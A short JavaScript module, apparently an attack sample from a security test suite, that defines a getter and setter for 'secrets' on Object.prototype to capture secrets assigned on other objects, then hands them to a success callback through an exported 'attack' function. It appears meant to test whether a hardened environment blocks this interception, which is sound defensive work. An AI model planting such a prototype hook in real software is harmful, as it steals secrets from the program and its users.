let stolen;

// grab all secrets, because of override mistake
Object.defineProperty(Object.prototype, "secrets", {
  get: () => stolen,
  set: (v) => {
    stolen = v;
  }
});

export const attack = (_authzManager, success) => {
  if (stolen) {
    success(stolen);
  }
};
